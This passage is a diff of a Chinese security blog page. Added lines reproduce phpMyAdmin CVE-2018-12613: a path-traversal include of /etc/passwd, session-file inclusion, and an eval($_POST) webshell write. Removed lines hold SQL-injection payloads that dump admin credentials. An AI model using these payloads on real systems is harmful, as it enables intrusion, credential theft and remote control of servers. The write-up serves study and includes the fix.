class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>这些文件都是可以被包含的。</p>
+<p>第二个if条件，判断$page是否被设置或$page是否为字符串，其中如果$page没有被设置或者$page不是字符串就会返回一个false。</p>
+<p>第三个if条件，判断$page对应的值是否在$whitelist中。</p>
+<p>第四个if条件，以？分割取出前面的字符串，再判断该值是否存在于$goto_whilelist某个数组中。这个判断的作用是在target值含有参数的情况下，phpmyadmin也能正确的包含文件。</p>
+<p>具体的来说，先要知道mb_strpos(haystack,needle)的作用是返回要查找的字符串在别一个字符串中首次出现的位置，这里haystack代表被检索字符串，needle表示需要查询的字符。</p>
+<p>再来看这一行，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>用连接符将$page与<code>?</code>拼接，然后在其中查询<code>?</code>第一次出现的位置，这样一看可能有些奇怪，先带着这样的认知，再总体来看这一段code。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = mb_substr(</span><br><span class="line">        <span class="variable">$page</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+<p>同样地，先要知道mb_substr不难看出，这是从$page中截取从位置0开始长度为mb_strpos($page . ‘?’, ‘?’)的一段字符串。而我们知道mb_strpos($page . ‘?’, ‘?’)所返回的是$page中第一个出现的<code>?</code>的位置，那么$_page最终所获取的是$page中再<code>?</code>前的所有字符。</p>
+<p>继续往下，$_page同样被判断是否在白名单中，看到这里，应该我们可以知道这里其实是phpmyadmin的开发者考虑到target值在可能带有参数的情况下，也应该被正确的包含。所以对数据进行了清洗。</p>
+<p>理解了这一边，后面其实做了类似的工作，只不过在此基础上将$page参数进行url解码再分割出<code>?</code>前的字符串判断是否包含在白名单内。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">   <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">       <span class="variable">$_page</span>,</span><br><span class="line">       <span class="number">0</span>,</span><br><span class="line">       mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">   );</span><br><span class="line">   <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>根据以上分析我们可以构造一个形如xxx.php?/../../../../../xxxx.php的payload传递给target参数。</p>
+<p>第一个xxx.php应该是一个可以通过白名单验证的php文件，我们可以从之前$goto_whitelist对应的数组任意挑选一个，第二个xxxx.php则是我们意图包含的文件。</p>
+<p>比如构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target&#x3D;sql.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p>这里服务器会自动进行一次url解码，所以需要对?二次编码为%253f。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target&#x3D;sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/szOp36"><img src="../images/bili.gif" data-original="https://s3.ax1x.com/2021/01/27/szOp36.png" alt="szOp36.png"></a></p>
+<p>成功包含文件。</p>
+<h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>phpmyadmin是默认会把执行的语句，记录在session文件当中的，所以可以利用包含session文件的方式来写入shell。</p>
+<p>执行SQL语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php phpinfo();?&gt;&quot;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/szLjE9"><img src="../images/bili.gif" data-original="https://s3.ax1x.com/2021/01/27/szLjE9.png" alt="szLjE9.png"></a></p>
+<p>PHP会序列化参数传递的值，并保存在本地的session文件中。查看当前phpmyadmin的cookie，并记录。</p>
+<img src="../images/bili.gif" data-original="/blog/posts/10a6c5c8.htm/image-20210127121036800.png" alt="image-20210127121036800">
 
-
-</li>
-</ul>
-<p><img src="../images/bili.gif" data-original="https://img-blog.csdnimg.cn/20210128221234908.png#pic_center" alt="在这里插入图片描述"></p>
-<p><strong>爆密码</strong></p>
-<p>比如针对admin表</p>
+<p>一般情况下，phpmyadmin的session文件会设置在/tmp目录下。</p>
+<p>（如linux下默认存储在/var/lib/php/session目录）</p>
+<p>进入dokcer容器，查看<code>tmp</code>路径下的session文件。</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/szLx41"><img src="../images/bili.gif" data-original="https://s3.ax1x.com/2021/01/27/szLx41.png" alt="szLx41.png"></a></p>
+<p>把该session文件包含进去</p>
 <p>构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,concat(username,&#39;|&#39;,password) from admin limit 0,1#</span><br></pre></td></tr></table></figure>
-
-
-
-<p>一次性爆出所有信息，可以这样构造</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(concat(username,&#39;|&#39;,password)) from admin #</span><br></pre></td></tr></table></figure>
-<p><img src="../images/bili.gif" data-original="https://img-blog.csdnimg.cn/20210128221306769.png#pic_center" alt="在这里插入图片描述"></p>
-<p>将username和password信息拼接在一起。</p>
-<p>一次性爆出所有信息，可以这样构造</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(concat(username,&#39;|&#39;,password)) from admin #</span><br></pre></td></tr></table></figure>
-<p><img src="../images/bili.gif" data-original="https://img-blog.csdnimg.cn/20210128221326429.png#pic_center" alt="在这里插入图片描述"></p>
-<p>当然这样还是有些麻烦，我们可以考虑编写一个自动化脚本来提交payload，爬取回显信息来完成自动化注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target&#x3D;sql.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_6f1f4267c65de394d87398d6ef54d893</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/szO9gK"><img src="../images/bili.gif" data-original="https://s3.ax1x.com/2021/01/27/szO9gK.png" alt="szO9gK.png"></a></p>
+<p>我们可以看到phpinfo被解析出现。如果要继续写入webshell，从phpinfo中搜索web路径，查找<code>CONTEXT_DOCUMENT_ROOT</code>这一栏目</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/szOS9x"><img src="../images/bili.gif" data-original="https://s3.ax1x.com/2021/01/27/szOS9x.png" alt="szOS9x.png"></a></p>
+<p>可以看到路径为/var/www/html，构造sql语句写入webshell，如这里利用php的file_put_contents函数将一个字符串写入文件中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php file_put_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;webshell.php&#39;,&#39;&lt;?php eval($_POST[a]);?&gt;&#39;);?&gt;&quot;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/szXKiR"><img src="../images/bili.gif" data-original="https://s3.ax1x.com/2021/01/27/szXKiR.png" alt="szXKiR.png"></a></p>
+<p>再次包含session文件。</p>
+<p>访问webshell.php文件，发现文件存在，说明写入成功。</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/szX8sO"><img src="../images/bili.gif" data-original="https://s3.ax1x.com/2021/01/27/szX8sO.png" alt="szX8sO.png"></a></p>
+<p>蚁剑连接。</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/szXtdH"><img src="../images/bili.gif" data-original="https://s3.ax1x.com/2021/01/27/szXtdH.png" alt="szXtdH.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/szXNod"><img src="../images/bili.gif" data-original="https://s3.ax1x.com/2021/01/27/szXNod.png" alt="szXNod.png" style="zoom:80%;"></a></p>
+<p>成功Getshell。</p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>参考官方的漏洞修复</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/szXdJI"><img src="../images/bili.gif" data-original="https://s3.ax1x.com/2021/01/27/szXdJI.png" alt="szXdJI.png"></a><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/szXaFA"><img src="../images/bili.gif" data-original="https://s3.ax1x.com/2021/01/27/szXaFA.png" alt="szXaFA.png"></a></p>
+<p>添加了一个include参数，当$include=true时,仅执行第一次判断$page的合法性，构造的payload将不会进入到urldecode的环节。</p>
 
     </div>
 
@@ -394,7 +417,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://cpelurker.github.io/posts/10a6c5c8.html" title="SQL注入 MySql5以上常规注入笔记">https://cpelurker.github.io/posts/10a6c5c8.html</a>
+    <a href="https://cpelurker.github.io/posts/10a6c5c8.html" title="文件包含漏洞（一）">https://cpelurker.github.io/posts/10a6c5c8.html</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-cn" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -407,7 +430,9 @@
           
           <div class="post-tags">
               <a href="/blog/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
-              <a href="/blog/tags/MySql/" rel="tag"><i class="fa fa-tag"></i> MySql</a>
+              <a href="/blog/tags/PhpMyadmin/" rel="tag"><i class="fa fa-tag"></i> PhpMyadmin</a>
+              <a href="/blog/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
+              <a href="/blog/tags/CVE/" rel="tag"><i class="fa fa-tag"></i> CVE</a>
           </div>
 
         
@@ -416,12 +441,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/blog/posts/8bc8a745.html" rel="prev" title="双系统 Win10下安装Linux（单/双硬盘）">
-      <i class="fa fa-chevron-left"></i> 双系统 Win10下安装Linux（单/双硬盘）
+    <a href="/blog/posts/b5fddb1e.html" rel="prev" title="OOB之DNS隧道利用">
+      <i class="fa fa-chevron-left"></i> OOB之DNS隧道利用
     </a></div>
       <div class="post-nav-item">
-    <a href="/blog/posts/111d1e8.html" rel="next" title="Nmap的基本操作">
-      Nmap的基本操作 <i class="fa fa-chevron-right"></i>
+    <a href="/blog/posts/d28420fb.html" rel="next" title="机器学习——分类问题">
+      机器学习——分类问题 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -481,7 +506,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">0x01 注入点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-number">2.</span> <span class="nav-text">0x02 判断字段数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="nav-number">3.</span> <span class="nav-text">0x03 收集信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0X04-%E6%9F%A5%E8%AF%A2%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF"><span class="nav-number">4.</span> <span class="nav-text">0X04 查询相关信息</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.</span> <span class="nav-text">相关函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%B1%E9%99%A9%E9%85%8D%E7%BD%AE"><span class="nav-number">1.3.</span> <span class="nav-text">危险配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.4.</span> <span class="nav-text">伪协议</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2018-12613-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">CVE-2018-12613 复现分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#index-php"><span class="nav-number">2.1.</span> <span class="nav-text">index.php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Getshell"><span class="nav-number">2.3.</span> <span class="nav-text">Getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">2.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -617,10 +642,10 @@
 
   
 
-<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/blog/live2dw/assets/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script><script>
+<script>
             window.imageLazyLoadSetting = {
                 isSPA: false,
                 processImages: null,
             };
-        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=i;var e=n.imageLazyLoadSetting.isSPA,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight||document.documentElement.clientHeight)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},n.src=i}()}i(),n.addEventListener("scroll",function(){var t,e;t=i,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=i;var e=n.imageLazyLoadSetting.isSPA,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight||document.documentElement.clientHeight)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},n.src=i}()}i(),n.addEventListener("scroll",function(){var t,e;t=i,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script><script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/blog/live2dw/assets/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
 </html>
